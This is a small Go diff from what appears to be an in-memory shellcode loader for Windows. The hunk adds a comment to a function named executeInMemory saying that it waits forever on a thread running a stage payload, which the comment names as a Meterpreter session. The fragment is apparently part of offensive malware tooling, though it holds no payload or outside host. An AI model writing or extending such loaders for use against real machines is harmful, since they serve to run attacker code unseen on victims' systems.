@@ -77,6 +77,10 @@ func executeInMemory(shellcode []byte) error {
 		return fmt.Errorf("CreateThread failed: %w", err)
 	}
 
+	// NOTE: WaitForSingleObject(INFINITE) blocks until the thread exits.
+	// This does not support context.Context cancellation because the Windows
+	// API has no interruptible wait that accepts a Go context. The stage
+	// payload is expected to run indefinitely (Meterpreter session).
 	windows.WaitForSingleObject(windows.Handle(thread), windows.INFINITE)
 	windows.CloseHandle(windows.Handle(thread))
 
